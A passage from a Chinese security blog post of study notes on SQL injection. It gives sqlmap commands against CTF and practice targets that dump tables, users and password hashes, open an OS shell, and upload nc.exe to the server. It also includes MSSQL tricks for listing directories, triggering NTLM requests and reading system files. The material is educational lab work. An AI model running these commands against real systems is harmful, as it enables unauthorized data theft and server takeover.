class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://demo.testfire.net/bank/login.aspx&quot; --data=&quot;uid=admin&amp;passw=admin&amp;btnSubmit=Login</span><br><span class="line">sqlmap -u &#x27;http://gz.imxbt.cn:20212/&#x27; --tables</span><br><span class="line">sqlmap -u &#x27;http://37ae4651-6527-47a3-a5b1-0e6371dbcb0c.node5.buuoj.cn:81/index.php?id=1&#x27; -D &#x27;note&#x27; -T &#x27;fl4g&#x27; --columns</span><br><span class="line">sqlmap -u &#x27;http://37ae4651-6527-47a3-a5b1-0e6371dbcb0c.node5.buuoj.cn:81/index.php?id=1&#x27; -D &#x27;note&#x27; -T &#x27;fl4g&#x27; -C &#x27;Column,fllllag&#x27; --dump</span><br><span class="line">sqlmap.py -u “http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2” #参数大于1时加双引号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.--level=5:探测等级,1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent/Referer在level为3时就会测试。</span><br><span class="line"></span><br><span class="line">2.--id-dba:当前用户是否为管理权限</span><br><span class="line"></span><br><span class="line">3.--roles:列出数据库管理员角色，仅适用于当前数据库是Oracle的时候</span><br><span class="line"></span><br><span class="line">4.--referer=https://www.baid.com :sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</span><br><span class="line"></span><br><span class="line">5.--sql-shell:运行自定义sql语句</span><br><span class="line"></span><br><span class="line">6.--os-cmd,--os-shell:运行任意操作系统命令</span><br><span class="line"></span><br><span class="line">7.--file-read &quot;C:/example.exe&quot;:从数据库服务器中读取文件</span><br><span class="line"></span><br><span class="line">8.sqlmap.py -u URL –file-write ”/software/nc.exe” –file-dest “C:/WINDOWS/Temp/nc.exe” 上传文件到数据库服务器中</span><br><span class="line"></span><br><span class="line">1.判断是否存在注入</span><br><span class="line">sqlmap -u http://127.0.0.1/sql/Less-1/?id=1       sqlmap -u http://pu2lh35s.ia.aqlab.cn/?id=1</span><br><span class="line">sqlmap -u “http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2” #参数大于1时加双引号</span><br><span class="line"></span><br><span class="line">2.判断文本中的请求是否存在注入          </span><br><span class="line">sqlmap.py -r test.txt #-r一般在存在cookie注入时使用</span><br><span class="line"></span><br><span class="line">3.查询当前用户下的所有数据库</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs</span><br><span class="line"></span><br><span class="line">4.获取数据库下的表名</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security --tables</span><br><span class="line"></span><br><span class="line">5.获取表中的字段名</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users --columns</span><br><span class="line"></span><br><span class="line">6.获取字段的内容</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users -C username,password --dump</span><br><span class="line"></span><br><span class="line">7.获取数据库的所有用户</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --users</span><br><span class="line"></span><br><span class="line">8.获取数据库用户的密码</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --password</span><br><span class="line"></span><br><span class="line">9.获取当前网站数据库的名称</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-db</span><br><span class="line"></span><br><span class="line">10.获取当前网站数据库的用户名称</span><br><span class="line">sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-user</span><br></pre></td></tr></table></figure>

<h6 id="SQLmap工具使用"><a href="#SQLmap工具使用" class="headerlink" title="SQLmap工具使用"></a>SQLmap工具使用</h6><h6 id="实战SQLmap"><a href="#实战SQLmap" class="headerlink" title="实战SQLmap"></a>实战SQLmap</h6><p>**<img src="/.io//image-20240124193648955-1754809764538-98.png" alt="image-20240124193648955"></p>
<p><img src="/.io//image-20240124193948826-1754809764538-99.png" alt="image-20240124193948826"></p>
<p>检测「注入点」sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘</p>
<p>查看所有「数据库」sqlmap -u ‘<a target="_blank" rel="noopener" href="http://node5.anna.nssctf.cn:28713/?id=1">http://node5.anna.nssctf.cn:28713/?id=1</a> –dbs</p>
<p>查看当前使用的数据库sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db</p>
<p>查看「数据表」sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables</p>
<p>查看「字段」sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –columns</p>
<p>查看「数据」sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</p>
<p><img src="/.io//image-20240124194205948-1754809764538-100.png" alt="image-20240124194205948"></p>
<p><img src="/.io//image-20240124194427098-1754809764538-101.png" alt="image-20240124194427098"></p>
<p><img src="/.io//image-20240124194502416-1754809764538-102.png" alt="image-20240124194502416"></p>
<h6 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h6><p>这题可以发现注入点，可以直接选择手工注入，但是更简单的是使用sqlmap<br>关于sqlmap如何post注入可以看下面的</p>
<p>首先需要用bp抓个包，把他copy到一个txt里面保存。</p>
<p>使用 sqlmap –r lqcx.txt –-dbs<br>就是使用我们保存的这个txt，去找数据库</p>
<p><img src="/.io//image-20250604214714574-1754809764538-104.png" alt="image-20250604214714574"></p>
<p>可以发现有如下数据库，因为是学校的录取查询，所以应该是school，当然不知道也没关系，每个看一遍也能找到flag<br><img src="/.io//462beaf732e2f8f37b10f35ceb1bd39f-1754809764538-103.png" alt="在这里插入图片描述"><br>然后sqlmap r lqcx.txt –D school –-table<br>就是找school数据库的表<br><img src="/.io//28033ac4dcbeac333ac2b9b4d7e5af53-1754809764538-105.png" alt="在这里插入图片描述"><br>可以发现有这两张表，所以当然是选择flag<br><img src="/.io//646cb0c8f3c6be32f1d5a7684e534c7b-1754809764538-106.png" alt="在这里插入图片描述"><br>使用sqlmap –r lqcx.txt –D school –T flag –-column<br>查找school数据库中的flag表的字段<br><img src="/.io//c1cf0dfc343c30b8ce6cc681503f4aa2-1754809764538-107.png" alt="在这里插入图片描述"><br>可以看到有flag字段<br><img src="/.io//352bee0595931d6d1caae6c9902067cd-1754809764538-108.png" alt="在这里插入图片描述"></p>
<p>使用sqlmap –r lqcx.txt –D school –T flag –C flag –-dump<br>就是查找school数据库中的flag表的flag字段，然后—dump弹出显示出来<br><img src="/.io//5a325bac50a275ff0c09e8d1422c47a0-1754809764538-110.png" alt="在这里插入图片描述"><br>就能得到flag<br><img src="/.io//31d78f3f4c001b0cc4a92ac7ab2e7021-1754809764538-109.png" alt="在这里插入图片描述"></p>
<h6 id="二"><a href="#二" class="headerlink" title="二"></a>二</h6><p>使用sqlmap注入，如下图所示；<br>A. 注入命令语句，如下图所示；<br><img src="/.io//t01ef068a23e8b646af-1754809764538-113.png" alt="img"><br>B. 注入结果，如下图所示；<br><img src="/.io//t01b8a4584808396102-1754809764538-112.png" alt="img"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><h1 id="MSSQL-数据库利用"><a href="#MSSQL-数据库利用" class="headerlink" title="MSSQL 数据库利用"></a>MSSQL 数据库利用</h1><p>Microsoft SQL Server 是微软开发的关系型数据库管理系统（DBMS），它具有极其广泛的用途，可以在各个方面使用，从存储个人博客的内容到存储客户数据等</p>
<p>SQL Server 默认开放的端口是 TCP 1433</p>
<p>我这里测试的版本是Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)</p>
<p>首先是一些基础的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SQL</span><br><span class="line">#查看当前用户名</span><br><span class="line">select user;</span><br><span class="line">#查看版本信息</span><br><span class="line">select @@version;</span><br><span class="line">#查看服务端主机名</span><br><span class="line">select @@servername;</span><br><span class="line">#查看当前数据库名</span><br><span class="line">select db_name();</span><br><span class="line">#查看客户端主机名</span><br><span class="line">select host_name();</span><br><span class="line">#查看是否是管理员</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br></pre></td></tr></table></figure>

<p>xp_dirtree 列文件夹、文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL</span><br><span class="line">execute master.dbo.xp_dirtree &#x27;c:\&#x27;,1,1;</span><br><span class="line">exec xp_dirtree &#x27;c:\&#x27;,1,1;</span><br></pre></td></tr></table></figure>

<p><img src="/.io//image-20250606201734465-1754809764538-111.png" alt="image-20250606201734465"></p>
<p>xp_dirtree 还可以用来触发 NTLM 请求</p>
<p>后续利用可以创建临时表来读文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL</span><br><span class="line">create table files(line varchar(1024));</span><br><span class="line">bulk insert files from &#x27;c:\windows\win.ini&#x27;;</span><br><span class="line">select * from files;</span><br></pre></td></tr></table></figure>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://emotion1star.github.io/2025/08/10/sql/">https://emotion1star.github.io/2025/08/10/sql/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">John Doe</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2025/08/10/sql/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="SQL">
                        
                        <span class="card-title">SQL</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-10
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            John Doe
                            
                        </span>
                    </div>
                </div>

                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/08/10/hello-world/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
                        
                        <span class="card-title">Hello World</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-10
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            John Doe
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <a href="/about" target="_blank">John Doe</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
